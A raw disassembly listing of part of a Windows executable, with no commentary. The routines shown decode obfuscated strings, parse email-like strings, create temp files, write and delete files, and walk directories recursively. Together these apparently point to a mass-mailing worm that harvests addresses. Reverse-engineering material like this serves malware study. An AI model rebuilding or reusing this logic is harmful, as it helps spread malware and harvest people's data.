loc_40385C:				; CODE XREF: sub_403739+136j
		mov	al, [ebx+edi]
		push	eax
		call	sub_403678
		test	eax, eax
		pop	ecx
		jz	short loc_403871
		inc	ebx
		cmp	byte ptr [ebx+edi], 0
		jnz	short loc_40385C

loc_403871:				; CODE XREF: sub_403739+121j
					; sub_403739+12Fj
		lea	eax, [ebx+edi]
		push	eax		; char *
		lea	eax, [ebp+var_7FC]
		push	eax		; char *
		call	_strcpy
		lea	eax, [ebp+var_7FC]
		push	eax		; char *
		push	edi		; char *
		call	_strcpy
		mov	eax, [ebp+var_4]
		add	esp, 10h
		sub	eax, ebx
		cmp	eax, [ebp+arg_C]
		jge	loc_403923
		mov	ebx, [ebp+arg_0]

loc_4038A2:				; CODE XREF: sub_403739+A5j
		cmp	[ebp+arg_18], 0
		jz	loc_403936
		mov	eax, [ebp+arg_0]
		and	byte ptr [edi],	0
		add	eax, esi
		xor	ebx, ebx
		push	eax
		call	sub_403703
		test	eax, eax
		pop	ecx
		jz	short loc_40391A
		mov	eax, [ebp+arg_8]
		add	eax, 0FFFFFFFEh
		mov	[ebp+arg_18], eax
		mov	eax, [ebp+arg_0]
		add	eax, esi
		mov	[ebp+arg_8], eax

loc_4038D2:				; CODE XREF: sub_403739+1DFj
		push	[ebp+arg_8]
		call	sub_403724
		test	eax, eax
		pop	ecx
		jnz	short loc_4038F8
		mov	eax, [ebp+arg_8]
		mov	cl, [eax]
		mov	[ebx+edi], cl
		mov	cl, [eax+1]
		inc	ebx
		inc	esi
		inc	eax
		mov	[ebx+edi], cl
		inc	ebx
		inc	esi
		inc	eax
		mov	[ebp+arg_8], eax
		jmp	short loc_4038FE
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4038F8:				; CODE XREF: sub_403739+1A4j
		inc	esi
		inc	esi
		add	[ebp+arg_8], 2

loc_4038FE:				; CODE XREF: sub_403739+1BDj
		cmp	esi, [ebp+arg_18]
		jge	short loc_40391A
		mov	eax, [ebp+arg_10]
		add	eax, 0FFFFFFFEh
		cmp	ebx, eax
		jge	short loc_40391A
		push	[ebp+arg_8]
		call	sub_403703
		test	eax, eax
		pop	ecx
		jnz	short loc_4038D2

loc_40391A:				; CODE XREF: sub_403739+186j
					; sub_403739+1C8j ...
		and	byte ptr [ebx+edi], 0
		cmp	ebx, [ebp+arg_C]
		jl	short loc_403933

loc_403923:				; CODE XREF: sub_403739+160j
		mov	eax, [ebp+arg_14]
		mov	dword ptr [eax], 1
		mov	eax, [ebp+arg_0]
		add	eax, esi
		jmp	short loc_40393F
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_403933:				; CODE XREF: sub_403739+1E8j
		mov	ebx, [ebp+arg_0]

loc_403936:				; CODE XREF: sub_403739+16Dj
		mov	eax, [ebp+arg_14]
		and	dword ptr [eax], 0

loc_40393C:				; CODE XREF: sub_403739+93j
		lea	eax, [esi+ebx]

loc_40393F:				; CODE XREF: sub_403739+25j
					; sub_403739+BFj ...
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_403739	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_403944	proc near		; CODE XREF: sub_401A1E+192p
					; sub_401A1E+22Ap ...

var_101C	= byte ptr -101Ch
var_1C		= dword	ptr -1Ch
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h

		push	ebp
		mov	ebp, esp
		mov	eax, 101Ch
		call	__alloca_probe
		push	ebx
		push	esi
		push	edi
		lea	ecx, [ebp+var_1C]
		call	sub_40174B
		mov	edi, [ebp+arg_4]
		lea	eax, [ebp+var_8]
		push	1
		push	eax
		push	[ebp+arg_0]
		xor	ebx, ebx
		lea	ecx, [ebp+var_1C]
		mov	[edi], bl
		call	sub_40174E
		mov	esi, eax
		cmp	esi, ebx
		jz	loc_403AA9
		mov	edx, [ebp+var_8]
		cmp	edx, 0Ah
		jb	loc_403AA1
		mov	[ebp+var_101C],	bl
		mov	[ebp+var_4], ebx

loc_403993:				; CODE XREF: sub_403944+7Cj
		push	[ebp+arg_10]
		lea	ecx, [ebp+var_4]
		push	ecx
		push	[ebp+arg_C]
		push	[ebp+arg_8]
		push	edx
		push	edi
		push	eax
		call	sub_403739
		mov	ecx, [ebp+var_8]
		add	esp, 1Ch
		mov	edx, ecx
		sub	edx, eax
		add	edx, esi
		cmp	edx, 5
		jle	loc_403A9F
		cmp	[ebp+var_4], ebx
		jz	short loc_403993
		mov	[ebp+arg_0], ebx
		xor	edi, edi

loc_4039C7:				; CODE XREF: sub_403944+C2j
		push	[ebp+arg_10]
		lea	edx, [ebp+var_4]
		sub	ecx, eax
		push	edx
		add	ecx, esi
		push	[ebp+arg_C]
		push	[ebp+arg_8]
		push	ecx
		lea	ecx, [ebp+var_101C]
		push	ecx
		push	eax
		call	sub_403739
		add	esp, 1Ch
		cmp	[ebp+var_4], ebx
		jz	short loc_4039F1
		inc	[ebp+arg_0]

loc_4039F1:				; CODE XREF: sub_403944+A8j
		mov	ecx, [ebp+var_8]
		mov	edx, ecx
		sub	edx, eax
		add	edx, esi
		cmp	edx, 5
		jbe	short loc_403A08
		inc	edi
		cmp	edi, 2710h
		jl	short loc_4039C7

loc_403A08:				; CODE XREF: sub_403944+B9j
		cmp	[ebp+arg_0], ebx
		jz	short loc_403A1E
		push	ebx
		call	sub_4046AB
		xor	edx, edx
		pop	ecx
		div	edi
		mov	ecx, [ebp+var_8]
		mov	[ebp+arg_0], edx

loc_403A1E:				; CODE XREF: sub_403944+C7j
		mov	edi, esi
		mov	[ebp+var_C], ebx

loc_403A23:				; CODE XREF: sub_403944+139j
		push	[ebp+arg_10]
		lea	eax, [ebp+var_4]
		sub	ecx, edi
		push	eax
		add	ecx, esi
		push	[ebp+arg_C]
		lea	eax, [ebp+var_101C]
		push	[ebp+arg_8]
		push	ecx
		push	eax
		push	edi
		call	sub_403739
		add	esp, 1Ch
		cmp	[ebp+var_4], ebx
		mov	edi, eax
		jz	short loc_403A65
		cmp	[ebp+arg_0], ebx
		jz	short loc_403A7F
		dec	[ebp+arg_0]
		lea	eax, [ebp+var_101C]
		push	eax		; char *
		push	[ebp+arg_4]	; char *
		call	_strcpy
		pop	ecx
		pop	ecx

loc_403A65:				; CODE XREF: sub_403944+106j
		mov	ecx, [ebp+var_8]
		mov	eax, ecx
		sub	eax, edi
		add	eax, esi
		cmp	eax, 5
		jbe	short loc_403A7F
		inc	[ebp+var_C]
		cmp	[ebp+var_C], 2710h
		jl	short loc_403A23

loc_403A7F:				; CODE XREF: sub_403944+10Bj
					; sub_403944+12Dj
		lea	ecx, [ebp+var_1C]
		call	sub_401808
		push	[ebp+arg_4]	; char *
		call	_strlen
		pop	ecx
		xor	ecx, ecx
		cmp	eax, [ebp+arg_8]
		setnl	cl
		mov	eax, ecx

loc_403A9A:				; CODE XREF: sub_403944+167j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_403A9F:				; CODE XREF: sub_403944+73j
		mov	[edi], bl

loc_403AA1:				; CODE XREF: sub_403944+40j
		lea	ecx, [ebp+var_1C]
		call	sub_401808

loc_403AA9:				; CODE XREF: sub_403944+34j
		xor	eax, eax
		jmp	short loc_403A9A
sub_403944	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_403AAD	proc near		; CODE XREF: sub_401A1E+2Cp
					; sub_4021CE+D8p ...

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		mov	edx, [ebp+arg_4]
		push	ebx
		xor	ebx, ebx
		push	esi
		test	edx, edx
		jz	short loc_403ABD
		and	[edx], bl

loc_403ABD:				; CODE XREF: sub_403AAD+Cj
		mov	eax, [ebp+arg_8]
		test	eax, eax
		jz	short loc_403AC7
		and	byte ptr [eax],	0

loc_403AC7:				; CODE XREF: sub_403AAD+15j
		mov	esi, [ebp+arg_0]
		cmp	byte ptr [esi],	40h
		jz	short loc_403AEB
		push	edi
		mov	edi, edx
		mov	eax, esi
		sub	edi, esi

loc_403AD6:				; CODE XREF: sub_403AAD+3Bj
		mov	cl, [eax]
		test	cl, cl
		jz	short loc_403AEA
		test	edx, edx
		jz	short loc_403AE3
		mov	[edi+eax], cl

loc_403AE3:				; CODE XREF: sub_403AAD+31j
		inc	ebx
		inc	eax
		cmp	byte ptr [eax],	40h
		jnz	short loc_403AD6

loc_403AEA:				; CODE XREF: sub_403AAD+2Dj
		pop	edi

loc_403AEB:				; CODE XREF: sub_403AAD+20j
		test	edx, edx
		jz	short loc_403AF3
		and	byte ptr [ebx+edx], 0

loc_403AF3:				; CODE XREF: sub_403AAD+40j
		cmp	byte ptr [ebx+esi], 0
		lea	eax, [ebx+esi]
		pop	esi
		pop	ebx
		jnz	short loc_403B02
		xor	eax, eax
		pop	ebp
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_403B02:				; CODE XREF: sub_403AAD+4Fj
		cmp	[ebp+arg_8], 0
		jz	short loc_403B13
		push	eax		; char *
		push	[ebp+arg_8]	; char *
		call	_strcpy
		pop	ecx
		pop	ecx

loc_403B13:				; CODE XREF: sub_403AAD+59j
		push	1
		pop	eax
		pop	ebp
		retn
sub_403AAD	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_403B18	proc near		; CODE XREF: sub_403B72+4p
					; sub_4042C9+31p ...

var_4		= dword	ptr -4
arg_0		= byte ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		mov	bl, [ebp+arg_0]
		push	esi
		push	edi
		mov	esi, offset a__0 ; "-_"
		lea	edi, [ebp+var_4]
		movsw
		cmp	bl, 20h
		movsb
		jle	short loc_403B66
		cmp	bl, 7Eh
		jge	short loc_403B66
		movsx	esi, bl
		push	esi		; int
		call	_isalpha
		test	eax, eax
		pop	ecx
		jnz	short loc_403B6D
		push	esi		; int
		call	_isdigit
		test	eax, eax
		pop	ecx
		jnz	short loc_403B6D
		cmp	bl, 40h
		jz	short loc_403B6D
		cmp	bl, 2Eh
		jz	short loc_403B6D

loc_403B5A:				; CODE XREF: sub_403B18+4Cj
		cmp	bl, byte ptr [ebp+eax+var_4]
		jz	short loc_403B6D
		inc	eax
		cmp	eax, 2
		jl	short loc_403B5A

loc_403B66:				; CODE XREF: sub_403B18+18j
					; sub_403B18+1Dj
		xor	eax, eax

loc_403B68:				; CODE XREF: sub_403B18+58j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_403B6D:				; CODE XREF: sub_403B18+2Bj
					; sub_403B18+36j ...
		push	1
		pop	eax
		jmp	short loc_403B68
sub_403B18	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_403B72	proc near		; CODE XREF: sub_4042C9+E1p
					; sub_4042C9+F0p ...

arg_0		= dword	ptr  4

		push	[esp+arg_0]
		call	sub_403B18
		pop	ecx
		retn
sub_403B72	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_403B7D	proc near		; CODE XREF: sub_401198+86p
					; sub_401284+BDp ...

var_2000	= byte ptr -2000h
var_1000	= byte ptr -1000h
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		mov	eax, 2000h
		call	__alloca_probe
		push	[ebp+arg_0]	; char *
		lea	eax, [ebp+var_2000]
		push	eax		; char *
		call	_strcpy
		push	[ebp+arg_4]	; char *
		lea	eax, [ebp+var_1000]
		push	eax		; char *
		call	_strcpy
		lea	eax, [ebp+var_2000]
		push	eax		; char *
		call	__strlwr
		lea	eax, [ebp+var_1000]
		push	eax		; char *
		call	__strlwr
		lea	eax, [ebp+var_1000]
		push	eax		; char *
		lea	eax, [ebp+var_2000]
		push	eax		; char *
		call	_strstr
		add	esp, 20h
		leave
		retn
sub_403B7D	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_403BD8	proc near		; CODE XREF: sub_4013A9+18p
					; sub_4013A9+3Ap ...

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	esi
		mov	esi, offset aTW@WT@Y@WwYteW ; "ÇÙ]TÕŞWÜ@ÈÚßWÙ×Ù]T@ÅÚY\\ÙÕ×@ÏÔWWÜYTEÜW×Ú"...
		push	esi		; char *
		push	[esp+4+arg_0]	; char *
		call	_strcpy
		push	[esp+8+arg_4]
		push	esi
		call	sub_403434
		push	eax		; char *
		push	[esp+14h+arg_0]	; char *
		call	_strcat
		add	esp, 18h
		pop	esi
		retn
sub_403BD8	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_403C01	proc near		; CODE XREF: sub_405C05+66p
					; sub_405C05+77p

arg_0		= dword	ptr  8

		push	ebx
		mov	ebx, [esp+arg_0]
		push	esi
		push	edi
		push	ebx		; char *
		call	_strlen
		mov	edi, eax
		pop	ecx
		cmp	edi, 4
		jl	short loc_403C3A
		cmp	edi, 0Ch
		jg	short loc_403C3A
		xor	esi, esi
		test	edi, edi
		jle	short loc_403C35

loc_403C21:				; CODE XREF: sub_403C01+32j
		movsx	eax, byte ptr [esi+ebx]
		push	eax		; int
		call	_isdigit
		test	eax, eax
		pop	ecx
		jz	short loc_403C3A
		inc	esi
		cmp	esi, edi
		jl	short loc_403C21

loc_403C35:				; CODE XREF: sub_403C01+1Ej
		push	1
		pop	eax
		jmp	short loc_403C3C
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_403C3A:				; CODE XREF: sub_403C01+13j
					; sub_403C01+18j ...
		xor	eax, eax

loc_403C3C:				; CODE XREF: sub_403C01+37j
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_403C01	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_403C40	proc near		; CODE XREF: sub_405A58+107p
					; sub_405E8C+1Ap

var_104		= byte ptr -104h
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 104h
		push	ebx
		push	esi
		push	edi
		lea	eax, [ebp+var_104]
		xor	edi, edi
		push	eax		; char *
		push	edi		; char *
		push	edi		; char *
		push	edi		; char *
		push	[ebp+arg_0]	; char *
		call	__splitpath
		mov	esi, (offset aYRNyWnyvNy_Tnn+20h)
		push	edi
		push	esi
		call	sub_403464
		mov	ebx, eax
		add	esp, 1Ch
		cmp	ebx, edi
		jle	short loc_403C95

loc_403C75:				; CODE XREF: sub_403C40+53j
		push	edi
		push	esi
		call	sub_403434
		push	eax
		lea	eax, [ebp+var_104]
		push	eax
		call	unknown_libname_9 ; Microsoft VisualC 2-7/net runtime
		add	esp, 10h
		test	eax, eax
		jz	short loc_403CB7
		inc	edi
		cmp	edi, ebx
		jl	short loc_403C75

loc_403C95:				; CODE XREF: sub_403C40+33j
		lea	eax, [ebp+var_104]
		push	offset unk_40FD9E
		push	eax
		call	unknown_libname_9 ; Microsoft VisualC 2-7/net runtime
		neg	eax
		sbb	eax, eax
		pop	ecx
		and	eax, 63h
		pop	ecx
		add	eax, 0FFFFFF9Ch

loc_403CB2:				; CODE XREF: sub_403C40+79j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_403CB7:				; CODE XREF: sub_403C40+4Ej
		mov	eax, edi
		jmp	short loc_403CB2
sub_403C40	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_403CBB	proc near		; CODE XREF: sub_40565D+1F4p
					; sub_4058ED+D8p ...

NumberOfBytesWritten= dword ptr	 8
lpBuffer	= dword	ptr  0Ch
nNumberOfBytesToWrite= dword ptr  10h

		push	ebp
		mov	ebp, esp
		push	esi
		xor	esi, esi
		push	edi
		push	esi		; hTemplateFile
		push	20h		; dwFlagsAndAttributes
		push	2		; dwCreationDisposition
		push	esi		; lpSecurityAttributes
		push	3		; dwShareMode
		push	0C0000000h	; dwDesiredAccess
		push	[ebp+NumberOfBytesWritten] ; lpFileName
		call	ds:CreateFileA
		mov	edi, eax
		mov	[ebp+NumberOfBytesWritten], esi
		cmp	edi, 0FFFFFFFFh
		jz	short loc_403D05
		cmp	[ebp+lpBuffer],	esi
		jz	short loc_403D05
		lea	eax, [ebp+NumberOfBytesWritten]
		push	esi		; lpOverlapped
		push	eax		; lpNumberOfBytesWritten
		push	[ebp+nNumberOfBytesToWrite] ; nNumberOfBytesToWrite
		push	[ebp+lpBuffer]	; lpBuffer
		push	edi		; hFile
		call	ds:WriteFile
		push	edi		; hObject
		call	ds:CloseHandle
		push	1
		pop	eax
		jmp	short loc_403D07
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_403D05:				; CODE XREF: sub_403CBB+25j
					; sub_403CBB+2Aj
		xor	eax, eax

loc_403D07:				; CODE XREF: sub_403CBB+48j
		pop	edi
		pop	esi
		pop	ebp
		retn
sub_403CBB	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_403D0B	proc near		; CODE XREF: sub_4022DB+22Ap

FileSizeHigh	= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ebx
		push	edi
		push	0		; hTemplateFile
		push	27h		; dwFlagsAndAttributes
		push	3		; dwCreationDisposition
		push	0		; lpSecurityAttributes
		push	3		; dwShareMode
		push	80000000h	; dwDesiredAccess
		push	[ebp+FileSizeHigh] ; lpFileName
		call	ds:CreateFileA
		and	[ebp+FileSizeHigh], 0
		mov	edi, eax
		or	ebx, 0FFFFFFFFh
		cmp	edi, ebx
		jz	short loc_403D52
		lea	eax, [ebp+FileSizeHigh]
		push	eax		; lpFileSizeHigh
		push	edi		; hFile
		call	ds:GetFileSize
		cmp	[ebp+FileSizeHigh], 0
		mov	ebx, eax
		jz	short loc_403D4B
		or	ebx, 0FFFFFFFFh

loc_403D4B:				; CODE XREF: sub_403D0B+3Bj
		push	edi		; hObject
		call	ds:CloseHandle

loc_403D52:				; CODE XREF: sub_403D0B+28j
		mov	eax, ebx
		pop	edi
		pop	ebx
		pop	ebp
		retn
sub_403D0B	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_403D58	proc near		; CODE XREF: sub_4048EF+11Fp
					; sub_4060CD+99p

var_14		= dword	ptr -14h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 14h
		lea	ecx, [ebp+var_14]
		call	sub_40174B
		lea	eax, [ebp+var_4]
		push	1
		push	eax
		lea	ecx, [ebp+var_14]
		push	[ebp+arg_0]
		call	sub_40174E
		test	eax, eax
		jz	short loc_403D88
		lea	ecx, [ebp+var_14]
		call	sub_401808
		push	1
		pop	eax
		leave
		retn
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_403D88:				; CODE XREF: sub_403D58+21j
		xor	eax, eax
		leave
		retn
sub_403D58	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_403D8C	proc near		; CODE XREF: sub_40565D+9Cp
					; sub_4060CD+76p ...

PathName	= byte ptr -118h
PrefixString	= byte ptr -14h
lpTempFileName	= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 118h
		push	esi
		push	4
		push	5
		lea	eax, [ebp+PrefixString]
		push	2
		push	eax
		call	sub_403624
		add	esp, 10h
		lea	eax, [ebp+PathName]
		push	eax		; lpBuffer
		push	104h		; nBufferLength
		call	ds:GetTempPathA
		mov	esi, [ebp+lpTempFileName]
		lea	eax, [ebp+PrefixString]
		push	esi		; lpTempFileName
		push	0		; uUnique
		push	eax		; lpPrefixString
		lea	eax, [ebp+PathName]
		push	eax		; lpPathName
		call	ds:GetTempFileNameA
		push	esi
		call	sub_403DFA
		push	esi		; char *
		call	_strlen
		pop	ecx
		pop	ecx

loc_403DDF:				; CODE XREF: sub_403D8C+5Aj
		dec	eax
		js	short loc_403DE8
		cmp	byte ptr [eax+esi], 2Eh
		jnz	short loc_403DDF

loc_403DE8:				; CODE XREF: sub_403D8C+54j
		add	eax, esi
		push	offset aYRNyWnyvNy_Tnn ; char *
		push	eax		; char *
		call	_strcpy
		pop	ecx
		pop	ecx
		pop	esi
		leave
		retn
sub_403D8C	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_403DFA	proc near		; CODE XREF: sub_4013FA+1CBp
					; sub_403D8C+46p ...

lpFileName	= dword	ptr  4

		push	20h		; dwFileAttributes
		push	[esp+4+lpFileName] ; lpFileName
		call	ds:SetFileAttributesA
		push	[esp+lpFileName] ; lpFileName
		call	ds:DeleteFileA
		retn
sub_403DFA	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_403E11	proc near		; CODE XREF: sub_403E11+10Fp
					; sub_405CA4+34p ...

FindFileData	= byte ptr -348h
FileName	= byte ptr -209h
var_104		= byte ptr -104h
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 348h
		push	esi
		push	edi
		push	[ebp+arg_0]	; char *
		lea	eax, [ebp-208h]
		xor	esi, esi
		push	eax		; char *
		call	_strcpy
		lea	eax, [ebp-208h]
		push	eax		; char *
		call	_strlen
		add	esp, 0Ch
		test	eax, eax
		jz	short loc_403E57
		cmp	[ebp+eax+FileName], 5Ch
		lea	eax, [ebp+eax+FileName]
		jnz	short loc_403E57
		and	byte ptr [eax],	0
		push	1
		pop	esi

loc_403E57:				; CODE XREF: sub_403E11+2Dj
					; sub_403E11+3Ej
		lea	eax, [ebp-208h]
		push	offset a__1	; char *
		push	eax		; char *
		call	_strcat
		pop	ecx
		lea	eax, [ebp+FindFileData]
		pop	ecx
		push	eax		; lpFindFileData
		lea	eax, [ebp-208h]
		push	eax		; lpFileName
		call	ds:FindFirstFileA
		mov	edi, eax
		cmp	edi, 0FFFFFFFFh
		jz	loc_403F5D

loc_403E89:				; CODE XREF: sub_403E11+13Fj
		push	[ebp+arg_0]	; char *
		lea	eax, [ebp+var_104]
		push	eax		; char *
		call	_strcpy
		pop	ecx
		test	esi, esi
		pop	ecx
		jnz	short loc_403EB1
		lea	eax, [ebp+var_104]
		push	offset asc_40E044 ; char *
		push	eax		; char *
		call	_strcat
		pop	ecx
		pop	ecx

loc_403EB1:				; CODE XREF: sub_403E11+8Bj
		lea	eax, [ebp-31Ch]
		push	eax		; char *
		lea	eax, [ebp+var_104]
		push	eax		; char *
		call	_strcat
		test	[ebp+FindFileData], 10h
		pop	ecx
		pop	ecx
		jz	short loc_403F2A
		lea	eax, [ebp-31Ch]
		push	offset a__2	; char *
		push	eax		; char *
		call	_strcmp
		pop	ecx
		test	eax, eax
		pop	ecx
		jz	short loc_403F40
		lea	eax, [ebp-31Ch]
		push	offset a__	; char *
		push	eax		; char *
		call	_strcmp
		pop	ecx
		test	eax, eax
		pop	ecx
		jz	short loc_403F40
		push	[ebp+arg_8]
		lea	eax, [ebp+var_104]
		push	1
		push	eax
		call	[ebp+arg_4]
		add	esp, 0Ch
		test	eax, eax
		jz	short loc_403F40
		push	[ebp+arg_8]
		lea	eax, [ebp+var_104]
		push	[ebp+arg_4]
		push	eax
		call	sub_403E11
		add	esp, 0Ch
		jmp	short loc_403F40
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_403F2A:				; CODE XREF: sub_403E11+BCj
		push	[ebp+arg_8]
		lea	eax, [ebp+var_104]
		push	0
		push	eax
		call	[ebp+arg_4]
		add	esp, 0Ch
		test	eax, eax
		jz	short loc_403F56

loc_403F40:				; CODE XREF: sub_403E11+D3j
					; sub_403E11+EAj ...
		lea	eax, [ebp+FindFileData]
		push	eax		; lpFindFileData
		push	edi		; hFindFile
		call	ds:FindNextFileA
		test	eax, eax
		jnz	loc_403E89

loc_403F56:				; CODE XREF: sub_403E11+12Dj
		push	edi		; hFindFile
		call	ds:FindClose

loc_403F5D:				; CODE XREF: sub_403E11+72j
		pop	edi
		xor	eax, eax
		pop	esi
		leave
		retn
sub_403E11	endp


